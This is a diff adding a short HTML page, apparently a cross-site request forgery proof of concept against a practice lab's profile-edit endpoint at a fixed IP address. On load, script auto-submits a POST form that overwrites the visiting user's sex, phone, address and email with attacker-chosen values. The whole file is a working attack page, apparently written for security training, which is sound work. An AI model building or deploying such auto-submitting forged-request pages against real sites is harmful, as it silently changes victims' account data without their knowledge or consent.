@@ -1,0 +1,22 @@
+<html>
+  <head>
+    <script>
+      // 自动点击提交
+      window.onload = function () {
+        document.getElementById('postsubmit').click()
+      }
+    </script>
+  </head>
+  <body>
+    <form
+      method="post"
+      action="http://175.178.126.31:8083/vul/csrf/csrfpost/csrf_post_edit.php"
+    >
+      <input id="sex" type="text" name="sex" value="boy" />
+      <input id="phonenum" type="text" name="phonenum" value="100000002" />
+      <input id="add" type="text" name="add" value="hacker" />
+      <input id="email" type="text" name="email" value="dummy@hacker.com" />
+      <input id="postsubmit" type="submit" name="submit" value="submit" />
+    </form>
+  </body>
+</html>
